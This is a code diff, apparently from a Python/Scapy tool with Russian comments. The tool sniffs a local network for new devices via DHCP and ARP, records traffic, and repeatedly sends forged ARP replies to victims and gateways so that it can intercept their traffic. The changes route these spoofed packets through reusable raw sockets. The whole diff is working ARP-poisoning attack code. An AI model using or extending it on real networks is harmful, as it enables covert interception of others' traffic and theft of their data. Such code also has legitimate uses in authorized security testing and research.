@@ -59,7 +59,7 @@ def on_key_press(event):
         os.system(f"sudo kill -9 {PID} > /dev/null")
 
 
-def arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac):
+def arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac, s=""):
     """
   Функция для ARP-подделки.
 
@@ -71,13 +71,19 @@ def arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac):
   пакет летит к target ip адресу (заранее разрешит его по arp-у сам (если не прописан заголовок Ethernet))
   """
     if target_ip != "0.0.0.0" and target_ip != "255.255.255.255":
-        arp_to_victim_packet = Ether(dst=victim_mac) / ARP(op=2, psrc=target_ip, hwsrc=spoof_mac, hwdst=victim_mac)
-        sendp(arp_to_victim_packet, verbose=0, count=1)
+        arp_to_victim_packet = ARP(op=2, psrc=target_ip, hwdst=victim_mac, pdst=victim_ip)
+        if s == "":
+            sendp(arp_to_victim_packet, verbose=0, count=1)
+        else:
+            s.send(arp_to_victim_packet)
 
     if bidirectional:
         if victim_ip != "0.0.0.0" and victim_ip != "255.255.255.255":
-            arp_to_target_packet = Ether(dst=target_mac) / ARP(op=2, psrc=victim_ip, hwsrc=spoof_mac, hwdst=target_mac)
-            sendp(arp_to_target_packet, verbose=0, count=1)
+            arp_to_target_packet = ARP(op=2, psrc=victim_ip, hwdst=target_mac, pdst=target_ip)
+            if s == "":
+                sendp(arp_to_target_packet, verbose=0, count=1)
+            else:
+                s.send(arp_to_target_packet)
 
     if verbose_enabled:
         print(f"Был перехвачен кадр от {victim_ip} ({victim_mac}) -> к {target_ip} ({target_mac})")
@@ -105,11 +111,12 @@ class Sniffer:
         self.spoof_ip = get_if_addr(self.interface)
         
 
-    def sniff_and_find_new_devices(self):
+    def sniff_and_find_new_devices(self, s):
         """
         Функция для поиска новых устройств по DHCP и ARP,
         записи трафика в .pcap файл и передачи данных в очередь.
         """
+        self.s = s
         # Запись трафика в pcap файл
         if self.pcap_name != "":
             #pcap = str(pcap_name.partition("."))[0]
@@ -194,7 +201,7 @@ class Sniffer:
                     self.queue.put((target_ip, target_mac))
 
                     if target_ip != self.spoof_ip and victim_ip != self.spoof_ip and target_mac != self.spoof_mac and victim_mac != self.spoof_mac:
-                        arp_spoof(self.spoof_mac, victim_ip, victim_mac, target_ip, target_mac)
+                        arp_spoof(self.spoof_mac, victim_ip, victim_mac, target_ip, target_mac, self.s)
 
                     if target_ip not in self.known_ips:
                         self.known_ips.append(target_ip)
@@ -215,7 +222,7 @@ class Sniffer:
                     self.queue.put((target_ip, target_mac))
 
                     if target_ip != self.spoof_ip and victim_ip != self.spoof_ip and target_mac != self.spoof_mac and victim_mac != self.spoof_mac:
-                        arp_spoof(self.spoof_mac, victim_ip, victim_mac, target_ip, target_mac)
+                        arp_spoof(self.spoof_mac, victim_ip, victim_mac, target_ip, target_mac, self.s)
             
 
         elif packet.haslayer(IP):
@@ -450,8 +457,11 @@ def main():
 
     sniffer = Sniffer(interface, queue, pcap_name, rotate_output_len)
 
+    s = conf.L3socket(iface=interface)
+    s2 = conf.L2socket(iface=interface)
+
     # Запускаем параллельный процесс для сканирования
-    sniff_thread = threading.Thread(target=sniffer.sniff_and_find_new_devices, args=())
+    sniff_thread = threading.Thread(target=sniffer.sniff_and_find_new_devices, args=(s))
     sniff_thread.daemon = True  # Делаем поток фоновым
     sniff_thread.start()
     logger.info("Started sniffing thread")
@@ -476,9 +486,6 @@ def main():
     for ip in old_list:
         last_spoof_time[ip] = time.time()
     logger.info(f"Studying local network gave us devices: {old_list}")
-
-    s = conf.L3socket(iface=interface)
-    s2 = conf.L2socket(iface=interface)
 
     while True:
         try:
@@ -505,13 +512,13 @@ def main():
                     old_list.append(target_ip)
                     logger.info(f"Found new ip, my ip_base is know {old_list}")
                     # Отправляем ARP-подделку для нового запрашиваемого устройства сразу
-                    arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac)
+                    arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac, s)
                     last_spoof_time[target_ip] = time.time()
                 else:
                     # Проверяем время последней ARP-подделки для этого устройства
                     if target_ip in last_spoof_time and time.time() - last_spoof_time[target_ip] >= int(max_silent_time/8):
                         # Отправляем ARP-подделку, если прошло более 15 секунд
-                        arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac)
+                        arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac, s)
                         last_spoof_time[target_ip] = time.time()
             if time.time() - global_resend_time >= renew_arp_spoof_time:
                 # Переотправка в эфир подделки собой всех найденных локальных ip
